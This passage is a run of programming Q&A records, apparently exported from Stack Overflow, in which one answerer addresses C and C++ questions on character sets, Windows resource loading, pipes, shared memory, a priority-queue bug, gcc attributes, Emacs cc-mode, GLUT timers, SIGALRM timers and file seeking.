<p>I believe these are the same as the <strong>Basic Character Set</strong>, though I'm guessing as C99 does not explicitly state this. The remaining Character Sets are a bit of a mystery to me.</p>

<p>Thanks for any help you can offer! :)</p>
","9530","","<p>Except for the Basic Character Set as you mentioned, all of the rest of the character sets are <strong>implementation-defined</strong>.  That means that they could be anything, but the <em>implementation</em> (that is, the C compiler/libraries/toolchain implementation) <em>must document</em> those decisions.  The key paragraphs here are:</p>

<blockquote>
  <p>§3.4.1 <strong>implementation-defined behavior</strong><br>
  unspecified behavior where each implementation documents how the choice is made</p>
  
  <p>§3.4.2 <strong>locale-specific behavior</strong><br>
  behavior that depends on local conventions of nationality, culture, and language that each implementation documents</p>
  
  <p>§5.2.1.1 <strong>Character sets</strong><br>
  Two sets of characters and their associated collating sequences shall be defined: the set in which source files are written (the <em>source character set</em>), and the set interpreted in the execution environment (the <em>execution character set</em>). Each set is further divided into a <em>basic character set</em>, whose contents are given by this subclause, and a set of zero or more <strong>locale-specific members</strong> (which are not members of the basic character set) called <em>extended characters</em>. The combined set is also called the <em>extended character set</em>. The values of the members of the execution character set are <strong>implementation-defined</strong>.</p>
</blockquote>

<p>So, look at your C compiler's documentation to find out what the other character sets are.  For example, in my man page for gcc, some of the command line options state:</p>

<pre>
   -fexec-charset=charset
       Set the execution character set, used for string and character
       constants.  The default is UTF-8.  charset can be any encoding
       supported by the system's ""iconv"" library routine.

   -fwide-exec-charset=charset
       Set the wide execution character set, used for wide string and
       character constants.  The default is UTF-32 or UTF-16, whichever
       corresponds to the width of ""wchar_t"".  As with -fexec-charset,
       charset can be any encoding supported by the system's ""iconv""
       library routine; however, you will have problems with encodings
       that do not fit exactly in ""wchar_t"".

   -finput-charset=charset
       Set the input character set, used for translation from the
       character set of the input file to the source character set used by
       GCC.  If the locale does not specify, or GCC cannot get this
       information from the locale, the default is UTF-8.  This can be
       overridden by either the locale or this command line option.
       Currently the command line option takes precedence if there's a
       conflict.  charset can be any encoding supported by the system's
       ""iconv"" library routine.
</pre>

<p>To get a list of the encodings supported by <code>iconv</code>, run <code>iconv -l</code>.  My system has 143 different encodings to choose from.</p>
"
"<p>I'm reading an entry from the registry that comes out something like:</p>

<p><code>@%SystemRoot%\\System32\\wscsvc.dll,-200</code></p>

<p>I need to actually load the string from the file.</p>

<p>I found <a href=""http://msdn.microsoft.com/en-us/library/bb776416.aspx"" rel=""nofollow"">an article</a> which describes how the number on the end behaves (negative == specific resource ID, positive == the nth resource in the file), but I'm confused as to how one might load the resource. The <code>ExtractIcon</code> function seems to do the resource loading I need, but it returns an <code>HICON</code>, not a string.</p>

<p>How might I load the string from the file?</p>
","9530","","<p>Load the DLL with <a href=""http://msdn.microsoft.com/en-us/library/ms684175%28VS.85%29.aspx"" rel=""nofollow""><code>LoadLibrary</code></a>, load the string with <a href=""http://msdn.microsoft.com/en-us/library/ms647486%28VS.85%29.aspx"" rel=""nofollow""><code>LoadString</code></a>, and then unload the DLL (assuming you don't need anything else from it) with <a href=""http://msdn.microsoft.com/en-us/library/ms683152%28VS.85%29.aspx"" rel=""nofollow""><code>FreeLibrary</code></a>:</p>

<pre><code>HMODULE hDll = LoadLibrary(""C:\\WINDOWS\\System32\\wscsvc.dll"");
if(hDll != NULL)
{
    wchar_t *str;
    if(LoadStringW(hDll, +200, (LPWSTR)&amp;str, 0) &gt; 0)
        ;  // success!  str now contains a (read-only) pointer to the desired string
    else
        ;  // handle error
    FreeLibrary(hDll);
}
else
    ;  // handle error
</code></pre>

<p>Note that <code>LoadLibrary</code> (and pretty much any other function that takes in a filename) does not understand environment variables like <code>%SystemRoot%</code>.  You'll have to use a function such as <a href=""http://msdn.microsoft.com/en-us/library/ms724265%28VS.85%29.aspx"" rel=""nofollow""><code>ExpandEnvironmentStrings</code></a> to expand the environment variables in the DLL filename before passing it to <code>LoadLibrary</code>.</p>
"
"<p>My C application relies on some files to copy over. Will the files be contained in the executable and not as stand-alone files? Would it have to be linked statically? I am using Eclipse CDT if it matters.</p>
","9530","","<p>Unless you do something special, no, the files will not be included in your executable.  Is there a reason you can't distribute the text files with your application?</p>

<p>If you want to bake the files into your executable, you can bake them in constant strings:</p>

<pre><code>const char myTextFileData[] = ""the text of the file goes here"";
</code></pre>

<p>Of course, you'll have to preprocess your text files into C source files (remembering to properly escape quotes, backslashes, newlines, and other control characters).  Alternatively you can use a tool such as <a href=""http://sourceware.org/binutils/docs/binutils/objcopy.html"" rel=""nofollow""><code>objcopy</code></a> to convert the file data directly into an object file and then link that object file into your executable.</p>
"
"<p>I'm having problems with std::getline on Mac OSX Snow Leopard. For some reason it limit the size of the input, while on Debian/Ubuntu it's unlimited size?</p>

<pre><code>std::getline(std::cin, input)
</code></pre>

<p>Any clues about the limit?</p>
","9530","","<p>The C++ standard says this about the <code>getline</code> function:</p>

<hr>

<p><strong>21.3.7.9 Inserters and extractors [lib.string.io]</strong></p>

<pre><code>template&lt;class charT, class traits, class Allocator&gt;
  basic_istream&lt;charT,traits&gt;&amp;
    getline(basic_istream&lt;charT,traits&gt;&amp; is,
            basic_string&lt;charT,traits,Allocator&gt;&amp; str,
            charT delim);
</code></pre>

<p><strong>Effects:</strong> Begins by constructing a sentry object <code>k</code> as if by <code>basic_istream&lt;charT,traits&gt;::sentry k(is)</code>. If <code>bool(k)</code> is true, it calls
<code>str.erase()</code> and then extracts characters from <code>is</code> and appends them to <code>str</code> as if by calling
<code>str.append(1,c)</code> until any of the following occurs:</p>

<ul>
<li>end-of-file occurs on the input sequence (in which case, the <code>getline</code> function calls
<code>is.setstate(ios_base::eofbit)</code>).</li>
<li><code>c == delim</code> for the next available input character <code>c</code> (in which case, <code>c</code> is extracted but not appended) (27.4.5.3)</li>
<li><code>str.max_size()</code> characters are stored (in which case, the function calls <code>is.setstate(ios_base::failbit)</code>) (27.4.5.3)</li>
</ul>

<hr>

<p>So, the only reasons why you would be getting a short line are (a) your C++ implementation does not conform to the standard (highly unlikely), you're hitting end-of-file, or you're reading a 4 gigabyte line (highly unlikely).</p>
"
"<p>Is there a way in C++ to remove/trim a trailing new line from a text file?</p>

<p>For example</p>

<pre><code>content content
content content
content content
&lt;- this line in the text file is empty and needs to go -&gt;
</code></pre>
","9530","","<p>The most efficient method would be to seek to the end of the file and move the end-of-file pointer backwards.  Unfortunately this is not portable because there is no standard way of setting the end-of-file pointer in either the C or C++ standard libraries.  You need to use a platform-specific function such as <a href=""http://msdn.microsoft.com/en-us/library/aa365531%28v=VS.85%29.aspx"" rel=""nofollow""><code>SetEndOfFile</code></a> on Windows or <a href=""http://linux.die.net/man/2/ftruncate"" rel=""nofollow""><code>ftruncate</code></a> on POSIX.  For example:</p>

<pre><code>void RemoveFinalNewline(const char *filename)
{
#if defined(_WIN32)
    HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
        ;  // handle error

    LARGE_INTEGER fileSize;
    if(GetFileSizeEx(hFile, &amp;fileSize) == 0)
        ;  // handle error
    if(fileSize.QuadPart &lt; 2)
        ;  // this case is left as an exercise to the reader

    LARGE_INTEGER newFilePtr;
    newFilePtr.QuadPart = -2;
    if(SetFilePointerEx(hFile, &amp;newFilePtr, NULL, FILE_END) == 0)
        ;  // handle error

    char lastTwoBytes[2];
    if(ReadFile(hFile, lastTwoBytes, 2, NULL, NULL) == 0)
        ;  // handle error

    if(lastTwoBytes[1] == '\n')
    {
        fileSize.QuadPart--;
        if(lastTwoBytes[0] == '\r')
            fileSize.QuadPart--;
        if(SetFilePointerEx(hFile, &amp;fileSize, NULL, FILE_BEGIN) == 0)
            ;  // handle error
        if(SetEndOfFile(hFile) == 0)
            ;  // handle error
        // Success!
    }
    // else the file didn't end in a newline

    CloseHandle(hFile);  // and we're done
#else  // POSIX case; the non-Windows, non-POSIX case is left as an exercise
    int fd = open(filename, O_RDWR);
    if(fd == -1)
        ;  // handle error

    off_t fileSizeMinus1 = lseek(fd, -1, SEEK_END);
    if(fileSizeMinus1 == (off_t)-1)
        ;  // handle error

    // We're assuming that a newline is a bare LF '\n' here.  The CRLF case
    // is left as an exercise (hint: see the Windows case above)
    char lastChar;
    if(read(fd, &amp;lastChar, 1) != 1)
        ;  // handle error

    if(lastChar == '\n')
    {
        if(ftruncate(fd, fileSizeMinus1) == -1)
            ;  // handle error
        // else success!
    }
    // else the file does not end in a newline

    close(fd);  // and we're done
#endif
}
</code></pre>
"
"<p>Inside of this <a href=""http://github.com/petermichaux/bootstrap-scheme/blob/v0.1/scheme.c#L26"" rel=""nofollow"">first step</a> towards <a href=""http://michaux.ca/articles/scheme-from-scratch-bootstrap-v0_1-integers"" rel=""nofollow"">a bootstrapped scheme interpreter</a> I find the following set of typedef, struct, union, and enum definitions:</p>

<pre><code>typedef enum {FIXNUM} object_type;

typedef struct object {
    object_type type;
    union {
        struct {
            long value;
        } fixnum;
    } data;
} object;
</code></pre>

<p>In particular, I'm not sure I understand the point of the struct inside the union (<code>struct { long value; } fixnum;</code>) -- a struct with only one field, to hold a single long? Very strange. </p>

<p>But I'm not really sure I understand the larger point, too. I <em>think</em> what's going on with the enum definition is that he's setting up a number of possible type values for lexical entities, and that <code>object</code> is a way of holding these, but perhaps somebody with more practice in C than I have can offer a more detailed explanation. </p>

<p>Thanks!</p>
","9530","","<p>You're right, the struct-inside-a-union-inside-a-struct is rather useless in this code, but the author is using it as a stepping stone for the later code.  Since he knows what the future code is going to look like, he can prepare the earlier code to make the changes as minimal as possible.</p>

<p>In the second part of the tutorial, the definition expands to this:</p>

<pre><code>typedef enum {BOOLEAN, FIXNUM} object_type;

typedef struct object {
    object_type type;
    union {
        struct {
            char value;
        } boolean;
        struct {
            long value;
        } fixnum;
    } data;
} object;
</code></pre>

<p>Now an <code>object</code> can hold two different values (a boolean or an integer), so the union now serves a purpose.  The inner structures are still redundant, though.  Notice how none of the code dealing with fixnums has to change.</p>

<p>I suspect that the inner structures are there just for parallelism.  In v0.6, the author adds the <code>pair</code> type, which consists of a structure of two pointers.</p>
"
"<p>I have successfully piped the output of one command into the input of another and then show the output of the second command to the screen.</p>

<p>I want to do this with three successive commands. (actually eventually I want to do it with N commands passed into the program at run time.</p>

<p>This is my attempt at pipelining three commands together.</p>

<p>UPDATED: i updated my question to reflect my latest try. </p>

<pre><code>    #include &lt;string.h&gt;
    #include &lt;fstream&gt;
    #include &lt;iostream&gt;
    #include &lt;unistd.h&gt;
    #include &lt;stdio.h&gt;
    #include &lt;sys/wait.h&gt;
    #include &lt;sys/types.h&gt;
    using namespace std;

    int main(int argc, char * argv[])
    {
             pid_t pid;
        int pfd[2];
        char* prgname = NULL;
        if(pipe(pfd) == -1)
        {
                perror(""error on pipe call"");
                return(1);
        }
        for(int j = 0;j&lt;numberOfCommands;j++)
        {
                cout&lt;&lt;commands[j]&lt;&lt;""_""&lt;&lt;endl;
        }
        pid = fork();
        if(pid == 0){//child process
                close(pfd[0]); //close read end of pipe
                dup2(pfd[1],1);//connect the pipes
                close(pfd[1]);//close extra file descriptors
                prgname = (char*)""dmesg""; //commands[0];//first command
                execlp(prgname, prgname, 0);//Load the program
        }
        else
        {
                int pfd2[2];
                if(pipe(pfd2) == -1)
                {
                        perror(""error on pipe call 2"");
                        return(1);
                }
                pid = fork();
                if(pid == 0)//child
                {
                        close(pfd[1]);
                        dup2(pfd[0],0);
                        close(pfd[0]);
                        close(pfd2[0]);
                        dup2(pfd2[1],1);
                        close(pfd2[1]);
                        prgname = (char*)""sort"";
                        execlp(prgname,prgname,0);
                }
                else
                {
                close(pfd2[1]); //close the write end of the pipe
                dup2(pfd2[0],0);//connect the pipes
                close(pfd2[0]); //close extra file descriptor
                prgname = (char*)""more""; //commands[1];//now run the second command
                execlp(prgname, prgname, 0);//Load the program
                }
        }
        return 0;
}
</code></pre>

<p>i have hard coded all values for simplicity.
The program displays what should be the output of ""dmesg|more"" but does not do the sort part and then freezes. I see the begging of dmesg and more in the bottom left but i can not view any more. </p>

<p>Any ideas?</p>
","9530","","<p><a href=""http://linux.die.net/man/2/pipe"" rel=""nofollow""><code>pipe(2)</code></a> only provides 2 file descriptors for 1 pipe.  The 3rd file descriptor (<code>pfd[2]</code>) is junk and is never getting initialized.  If you want to create a pipeline with 3 commands in it, you need to call <code>pipe()</code> twice to get two pipes: one for connecting the first and second processes, and one for connecting the second and third processes.</p>
"
"<p>In Linux, When we are sharing data between 2 or more processes using shared memory, where does the shared memory gets allocated?</p>

<p>Will it become part of process address space at run time? as the process cannot access the memory outside its address space.</p>

<p>Could some one please clarify?</p>
","9530","","<p>When you have shared memory, then that memory gets mapped into the virtual address space of each process that shares the memory (not necessarily at the same virtual addresses in each process).  The virtual memory manager ensures that the virtual addresses both map to the same physical addresses so that the sharing actually happens.</p>
"
"<p>I am trying to write a PriorityQueue for a c project. The program is crashing when I try to dequeue items; however I think the issue is coming from the way I add the items, as If I try to access the first element in the list after adding the third element I get a crash as well.</p>

<p>Header file:</p>

<pre><code>#ifndef PQUEUE_H_INCLUDED 
#define PQUEUE_H_INCLUDED

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdbool.h&gt;

//Data structure for holding one element in pqueue
typedef struct _e {
    void *data;
    size_t datalen;
    int priority;
    struct _e *next;
} ELEMENT;

//data structure for the whole pqueue
typedef struct {
    ELEMENT *head;          //reference to first element 
    ELEMENT *tail;          //reference to last element
    ELEMENT *beforefirst;   //dummy element before first element;
    int elements;
} PQUEUE;


extern PQUEUE*  queue_new(void);
extern void     queue_free(PQUEUE *);
extern void     queue_add_end(PQUEUE *, void *, size_t);
extern void     queue_add_priority(PQUEUE *, void *, size_t,int);
extern void*    queue_remove(PQUEUE *);
extern bool     queue_has_next(PQUEUE *);
extern int      queue_size(PQUEUE *);


#endif 
</code></pre>

<p>PriorityQueue code:</p>

<pre><code>#include ""pqueue.h""

PQUEUE *queue_new(void) {
    PQUEUE *pq = malloc(sizeof(PQUEUE));
    if (pq == NULL) {
        perror(""queue_new"");
        exit(EXIT_FAILURE);
    }
    pq-&gt;head = NULL;
    ELEMENT *newelement;
    newelement = calloc(1,sizeof(ELEMENT));
    pq-&gt;beforefirst = newelement;
    pq-&gt;beforefirst-&gt;next = pq-&gt;head;
    pq-&gt;tail = NULL;
    pq-&gt;elements = 0;

    return pq;
}

void queue_free(PQUEUE *pq) {
    ELEMENT *this, *save;
    this = pq-&gt;head;
    while(this!= NULL) {
        save = this;
        this = this-&gt;next;
        free(save-&gt;data);
        free(save);
    }
    free(pq);
}


void queue_add_priority(PQUEUE *pq, void *data, size_t datalen,int priority) {
    ELEMENT *newelement;
    newelement = calloc(1,sizeof(ELEMENT));
    if (newelement == NULL) {
        perror(""queue_add"");
        exit(EXIT_FAILURE);
    }
    newelement-&gt;data = malloc(datalen);
    newelement-&gt;priority = priority;
    if(newelement-&gt;data == NULL) {
        perror(""queue_add"");
        exit(EXIT_FAILURE);
    }
    memcpy(newelement-&gt;data,data,datalen);
    newelement-&gt;datalen = datalen;
    newelement-&gt;next = NULL;
    //sets pointer at beforefirst element and iterates through queue until ptr-&gt;next
    // priority is greater than newlement priority, or until end of queue.
    ELEMENT *ptr = pq-&gt;beforefirst;
    while (ptr-&gt;next != NULL) {
        if (ptr-&gt;next-&gt;priority &gt; priority) break;
        ptr = ptr-&gt;next;
    }
    if (ptr == pq-&gt;beforefirst) {
        pq-&gt;head = newelement;
    }
    if (ptr-&gt;next == NULL) {
        pq-&gt;tail = newelement;
    }
    newelement-&gt;next = ptr-&gt;next;
    ptr-&gt;next = newelement;


    //ERROR HERE
    //void* d;
    //d = pq-&gt;head-&gt;data;
    pq-&gt;elements++;
}

void* queue_remove(PQUEUE *pq) {
    //ERROR HERE
    void* item = pq-&gt;head-&gt;data;
    pq-&gt;head = pq-&gt;head-&gt;next;
    pq-&gt;elements--;
    return item;
}

bool queue_has_next(PQUEUE *pq) {
    return !(pq-&gt;elements == 0);
}
</code></pre>

<p>Basically, the error seems to be coming when I try to access pq->head->data after I've added the third element - I narrowed it down to the areas commented //ERROR HERE. It seems odd to me because adding the third element should work identically to adding the second.
Also neither pq->head == NULL or pq->head>data == NULL.</p>
","9530","","<p>In addition to the problems that <a href=""http://stackoverflow.com/questions/3929884/problem-with-priorityqueue-in-c/3929983#3929983"">paxdiablo mentioned</a>, you're also forgetting to update <code>beforefirst-&gt;next</code> in the case where you remove the head of the queue.  Here's what's happening:</p>

<pre>
Before queue_remove:

  beforefirst             head                tail
       |                   |                   |
       V                   V                   V
+-------------+     +-------------+     +-------------+
| placeholder | --> |      x      | --> |      y      | --> NULL
+-------------+     +-------------+     +-------------+



After queue_remove:

  beforefirst                             head   tail
       |                                    |      |
       V                                    V      V
+-------------+     +-------------+     +-------------+
| placeholder | --> |      x      | --> |      y      | --> NULL
+-------------+     +-------------+     +-------------+
</pre>

<p>You need to fix <code>queue_remove</code> so that <code>beforefirst-&gt;next</code> points to <code>head-&gt;next</code> if <code>head</code> is non-NULL (NULL otherwise).</p>
"
"<p>I have a for loop where each step i, it processes an array element p[f(i)], where f(i) is an injective (one-to-one) map from 1...n to 1...m (m > n). So there is no data coupling in the loop and all compiler optimization techniques such as pipelining can be used. But how can I inform g++ of the injectivity of f(i)? Or do I even need to (can g++ figure that out)?</p>
","9530","","<p>Assuming that <code>f</code> doesn't rely on any global state and produces no side effects, you can tag it with the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g_t_0040code_007bconst_007d-function-attribute-2398"" rel=""nofollow""><code>const</code> attribute</a>:</p>

<pre><code>int f(int i) __attribute__((const));
</code></pre>

<p>If <code>f</code> does rely on global state but still has the property that it's a pure function of its inputs and global state (and produces no side effects), you can use the the slightly weaker <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g_t_0040code_007bpure_007d-function-attribute-2458"" rel=""nofollow""><code>pure</code> attribute</a>.</p>

<p>These attributes let gcc make more optimizations than it otherwise could, although I don't know if these will be helpful in your case.  Take a look at the generated assembly code and see if they help.</p>
"
"<p>I'm trying to byte-compile <a href=""http://prdownloads.sourceforge.net/cc-mode/cc-mode-5.31.3.tar.gz"" rel=""nofollow"">cc-mode 5.31.3</a> using emacs 23.1.1 as follows:</p>

<pre><code>$ emacs -batch --no-site-file -q -f batch-byte-compile *.el
</code></pre>

<p>But two of the files are failing to compile (in addition to numerous warnings):</p>

<pre>
In c-init-language-vars-for:
cc-mode.el:168:10:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:168:10:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:162:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:162:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:163:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:163:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:164:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:164:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:165:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:165:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:166:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:166:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:167:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:167:53:Warning: Function `mapcan' from cl package called at runtime
cc-mode.el:562:4:Error: Wrong type argument: sequencep, t

In c-make-styles-buffer-local:
cc-styles.el:634:6:Warning: `mapcar' called for effect; use `mapc' or `dolist'
    instead
cc-styles.el:636:9:Error: Wrong type argument: sequencep, t
</pre>

<p>What do these two errors mean, and how can I fix them?</p>

<p>Line 562 of cc-mode.el is this:</p>

<pre><code>  (c-update-modeline)
</code></pre>

<p>Where <code>c-update-modeline</code> is a function defined in <code>cc-cmds.el</code> that takes no arguments.  Line 636 of cc-styles.el part of this function:</p>

<pre><code>(defun c-make-styles-buffer-local (&amp;optional this-buf-only-p)
  ""Make all CC Mode style variables buffer local.
If `this-buf-only-p' is non-nil, the style variables will be made
buffer local only in the current buffer.  Otherwise they'll be made
permanently buffer local in any buffer that changes their values.

The buffer localness of the style variables are normally controlled
with the variable `c-style-variables-are-local-p', so there's seldom
any reason to call this function directly.""

  ;; style variables
  (let ((func (if this-buf-only-p
          'make-local-variable
        'make-variable-buffer-local))
    (varsyms (cons 'c-indentation-style (copy-alist c-style-variables))))
    (delq 'c-special-indent-hook varsyms)
    (mapcar func varsyms)
    ;; Hooks must be handled specially
    (if this-buf-only-p    ;;;;;;;;; LINE 636 ;;;;;;;;;;;;;;;;;;
        (make-local-hook 'c-special-indent-hook)
      (make-variable-buffer-local 'c-special-indent-hook)
      (setq c-style-variables-are-local-p t))
    ))
</code></pre>

<p>These error messages don't make sense.  Could the fact that I already have a different version of cc-mode installed with emacs be affecting this?  How do you recompile cc-mode?</p>
","9530","","<p>I'm still confused about these error messages, but the answer is that cc-mode 5.31.3 is rather old and can't be compiled with emacs 23 (I was trying to compile cc-mode for curiosity's sake).  emacs 23 ships with an updated version of cc-mode, version 5.31.7 -- run the interactive command <code>c-version</code> to get the version of cc-mode you're using.</p>

<p>For those who want to recompile cc-mode (and not use the compiled <code>cc-mode.elc</code> that ships with emacs), you should use download the latest version from <a href=""http://cc-mode.sourceforge.net/anoncvs.php"" rel=""nofollow"">anonymous CVS</a></p>
"
"<p>I am using a timer function to animate, but I am having issues when I place it in the Renderer class.</p>

<pre><code>void Renderer::animate(int value)
{
 glutTimerFunc(TIMERMSECS, animate, 0);
}
</code></pre>

<p>Error:
\renderer.cpp(242) : error C3867: 'Renderer::animate': function call missing argument list; use '&amp;Renderer::animate' to create a pointer to member</p>
","9530","","<p>The issue is that <code>Renderer::animate</code> is a class member function and so has a hidden <code>this</code> parameter.  <code>glutTimerFunc</code> doesn't know what value of <code>this</code> to pass, so if you somehow tried to sneak past the compiler with a nasty cast, it would crash at runtime.</p>

<p>The solution is to change <code>Renderer::animate</code> into a static method or an ordinary global function.  You then need to store the pointer to your <code>Renderer</code> instance in a global variable, e.g.:</p>

<pre><code>class Renderer
{
    static void staticAnimate(int value);
    void animate(int value);
    ...
};
Renderer *gRenderer = ...;

void Renderer::staticAnimate(int value)
{
    gRenderer-&gt;animate(value);
}

...

glutTimerFunc(TIMERMSECS, &amp;Renderer::staticAnimate, 0);
</code></pre>

<p>If <code>sizeof(void*) &lt;= sizeof(int)</code> (true on 32-bit systems but not true on 64-bit systems), then you could also pass the instance via the <code>value</code> parameter; however, since this is not portable and you won't ever need to call <code>glutTimerFunc</code> on multiple different instances simultaneously, you shouldn't have to worry about using a global variable for this.</p>
"
"<p>I have several threads. And I'd like to create sub-threads in one of them. So I'd like know whether java thread has a tree structure. Or the new created sub-threads is just the sibling of other threads. And What's the resource allocation strategy when these thread are competing for resources? Does the parent thread has higher priority ?
Thanks.</p>

<p>Jeff</p>
","9530","","<p>There's no thread hierarchy, all threads are siblings of each other.  There is no concept of ""parent thread"" or ""child thread"".  You'll have to be more specific about what you mean by resource allocation strategy -- what resources are you referring to?</p>

<p>If it's memory (by far the most common type of resource), then the answer is that the memory allocator is thread safe: multiple simultaneous allocations happening on different threads will always work correctly.  If you run out of memory, then some unlucky thread is going to get an <code>OutOfMemoryError</code>.</p>

<p>If you're referring to other types of resources, then it depends entirely on the implementation of the resource.  It's either going to be thread-safe or non-thread-safe.  If it's thread-safe, you can allocate the resources freely from multiple threads.  If it's not thread-safe, then read the documentation for that type of resource.</p>
"
"<p>I installed <a href=""http://www.emacswiki.org/emacs/CSharpMode"" rel=""nofollow"">emacs C# mode</a>.</p>

<p>The .emacs file is as follows</p>

<pre>
(require 'csharp-mode)
(setq auto-mode-alist
      (append '((""\\.cs$"" . csharp-mode)) auto-mode-alist))
(defun my-csharp-mode-fn ()
  ""function that runs when csharp-mode is initialized for a buffer.""
  (setq default-tab-width 4)
)
(add-hook  'csharp-mode-hook 'my-csharp-mode-fn t)
</pre>

<p>It works pretty fine, but I see the block ({..}) is aligned what I intended. I mean, in some cases I have this.</p>

<pre><code>private static int StringCompare(string x, string y)
{
  int result;
  if (x == null)
    {

    }
}
</code></pre>

<p>when I expect this</p>

<pre><code>private static int StringCompare(string x, string y)
{
  int result;
  if (x == null)
  {

  }
}
</code></pre>

<p>Together with this, I always have 2 indentation for the code, but I want it to be 4.</p>

<p>My questions are</p>

<ul>
<li>How can I control the indentation in C# emacs mode?</li>
<li>How can I control the '{' and '}' to have the  same indentation as it's previous code.</li>
<li>Does C# mode provide compilation to generate exe/dll file within the editor with commands?</li>
</ul>

<p>I use emacs C# mode on Mac OS X/mono.</p>

<h2>ADDED</h2>

<p>I found that C# mode can also use C mode, so M-x c-set-style works, and awk style just works for me. The problem is that I have to turn on awk mode whenever I use c mode. Is there a way to run ""M-x c-set-style and awk"" mode automatically with c mode?</p>
","9530","","<p>Add these lines to your <code>my-csharp-mode-fn</code>:</p>

<pre><code>; Set indentation level to 4 spaces (instead of 2)
(setq c-basic-offset 4)
; Set the extra indentation before a substatement (e.g. the opening brace in
; the consequent block of an if statement) to 0 (instead of '+)
(c-set-offset 'substatement-open 0)
</code></pre>

<p>Alternatively, you can add them to your common C mode hook, which runs for all C mode-related modes: C, C++, Objective-C, Java, C#, and more:</p>

<pre><code>(defun my-c-mode-common-hook ()
  (setq c-basic-offset 4)
  (c-set-offset 'substatement-open 0))
(add-hook 'c-mode-common-hook 'my-c-mode-common-hook)
</code></pre>

<p>See the <a href=""http://www.chemie.fu-berlin.de/chemnet/use/info/cc-mode/cc-mode_6.html"">CC mode documentation</a> for the nitty-gritty details on customizing indentation.</p>
"
"<p>I have a problem adding libs for zip extraction to my iPhone app.  </p>

<p>I decided to use <a href=""http://github.com/samsoffes/ssziparchive#readme"">SSZipArchive</a>. It uses minizip. </p>

<p>After following the instructions:   </p>

<p><strong>1 Add SSZipArchive.h, SSZipArchive.m, and minizip</strong><br>
<img src=""http://i.stack.imgur.com/NPHvf.jpg"" alt=""added minizip"">  </p>

<p><strong>2 Add the libz library to your target</strong><br>
<img src=""http://i.stack.imgur.com/D0lKA.png"" alt=""added libz""></p>

<p><strong>I still get errors:</strong><br>
<img src=""http://i.stack.imgur.com/IiMrM.png"" alt=""alt text""></p>

<p>Symbol(s) not found. </p>

<p>I tried adding -lz to Other Linker Flags and adding lybz.dylib but it didn't help. Please let me know if you know how to get libz to work here. </p>

<hr>

<p><strong>Solved:</strong> Instead of using a folder, I made a yellow reference group, removed /minizip/ from includes and now everything works.</p>
","9530","","<p><code>unzOpen</code>, <code>unzOpenCurrentFile</code>, and <code>unzOpenCurrentFilePassword</code> are functions defined in the minizip library.  The linker is complaining that it can't find those functions, which means they're not getting compiled or linked in properly.</p>

<p>Make sure that <code>minizip/unzip.c</code> is included in your project properly and double-check that it's getting compiled and linked.</p>
"
"<p>I'm using the GCC compiler and C++ and I want to make a timer that triggers an interruption when the countdown is 0. </p>

<p>Any Ideas? Thanks in advance.</p>

<p><strong>EDIT</strong></p>

<p>Thanks to Adam, I know how to do it.</p>

<p>Now. What about multiple timers running in parallel?</p>

<p>Actually, these timers are for something very basic. In NCURSES, I have a list of things. When I press a key, one of the things will change colors for 5 seconds. If I press another key, another thing in the list will do the same. It's like emphasize strings depending on the user input. Is there a simpler way to do that?</p>
","9530","","<p>One way to do it is to use the <a href=""http://linux.die.net/man/2/alarm"" rel=""nofollow""><code>alarm(2)</code></a> system call to send a <code>SIGALRM</code> to your process when the timer runs out:</p>

<pre><code>void sigalrm_handler(int sig)
{
    // This gets called when the timer runs out.  Try not to do too much here;
    // the recommended practice is to set a flag (of type sig_atomic_t), and have
    // code elsewhere check that flag (e.g. in the main loop of your program)
}

...

signal(SIGALRM, &amp;sigalrm_handler);  // set a signal handler
alarm(10);  // set an alarm for 10 seconds from now
</code></pre>

<p>Take careful note of the cautions in the man page of <code>alarm</code>:</p>

<blockquote>
  <p><strong>alarm()</strong> and <strong>setitimer()</strong> share the same timer; calls to one will interfere with use of the other.</p>
  
  <p><strong>sleep()</strong> may be implemented using <strong>SIGALRM</strong>; mixing calls to <strong>alarm()</strong> and <strong>sleep()</strong> is a bad idea.</p>
  
  <p>Scheduling delays can, as ever, cause the execution of the process to be delayed by an arbitrary amount of time. </p>
</blockquote>
"
"<p>Hi i want to overwrite the content(object) in a specific file i have set the position but it always add to the end of the file</p>

<p>Code</p>

<pre><code> int InputIO::editPatient(int location,Obj P){

        int positon=location*sizeof(P);
        f.open(""File.dat"",ios::in|ios::out|ios::app|ios::binary|ios::ate);
        f.seekp(0,ios::beg);
        f.seekp(positon,ios::cur);
        f.write((char*)&amp;P,sizeof(Movie));
        f.close();

        return 0;



        }
</code></pre>
","9530","","<p>Don't use the <code>ios::app</code> flag (which stands for <em>append</em>).  When you use this flag, it prevents you from reading or writing any of the content that was present in the file before you opened it -- you can only add new content to the end (and since you opened in read+write mode, you can re-read what you wrote and rewrite it, but you still can't get to the data before it).</p>
"
"<p>I am a complete novice to C, and during my university work I've come across comments in code that often refer to de-referencing a NULL pointer.  I do have a background in C#, I've been getting by that this might be similar to a ""NullReferenceException"" that you get in .Net, but now I am having serious doubts.  </p>

<p>Can someone please explain to me in laymans terms exactly what this is and why it is bad?</p>
","9530","","<p><em>Dereferencing</em> just means reading the memory value at a given address.  So when you have a pointer to something, to <em>dereference the pointer</em> means to read or write the data that the pointer points to.</p>

